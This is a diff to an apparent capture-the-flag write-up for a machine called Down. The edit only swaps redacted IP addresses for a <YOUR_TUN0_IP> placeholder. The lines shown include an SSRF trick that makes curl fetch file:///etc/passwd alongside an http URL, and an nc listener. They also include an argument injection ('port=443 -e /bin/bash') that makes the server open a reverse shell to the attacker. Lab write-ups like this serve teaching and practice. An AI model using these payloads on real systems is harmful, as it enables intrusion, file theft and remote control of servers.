@@ -31,7 +31,7 @@ Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app
   file://, gopher://, php:// → blocked ("Only http or https allowed")
   Regex only checks START of string: preg_match('|^https?://|')
   curl accepts multiple space-separated URLs
-  url=http://***REMOVED*** file:///etc/passwd → BOTH fetched!
+  url=http://<YOUR_TUN0_IP> file:///etc/passwd → BOTH fetched!
          │
          ▼
 [File Read via Dual URL Trick]
@@ -187,7 +187,7 @@ nc -lvnp 8889
 
 # Terminal 2 — trigger SSRF toward our listener
 curl -s -X POST \
-  -d "url=http://***REMOVED***:8889/" \
+  -d "url=http://<YOUR_TUN0_IP>:8889/" \
   http://down.htb/index.php
 ```
 
@@ -195,7 +195,7 @@ curl -s -X POST \
 
 ```
 GET / HTTP/1.1
-Host: ***REMOVED***:8889
+Host: <YOUR_TUN0_IP>:8889
 User-Agent: curl/7.81.0
 Accept: */*
 ```
@@ -262,7 +262,7 @@ curl http://attacker-ip file:///etc/passwd
 
 ```bash
 curl -s -X POST \
-  --data-urlencode "url=http://***REMOVED*** file:///etc/passwd" \
+  --data-urlencode "url=http://<YOUR_TUN0_IP> file:///etc/passwd" \
   http://10.129.234.87/index.php
 ```
 
@@ -351,13 +351,13 @@ nc -lnvp 443
 ```bash
 curl -s -X POST \
   "http://10.129.234.87/index.php?expertmode=tcp" \
-  -d "ip=***REMOVED***&port=443 -e /bin/bash"
+  -d "ip=<YOUR_TUN0_IP>&port=443 -e /bin/bash"
 ```
 
 The server constructs and executes:
 
 ```bash
-/usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
+/usr/bin/nc -vz <YOUR_TUN0_IP> 443 -e /bin/bash
 ```
 
 **Shell received as `www-data`.**
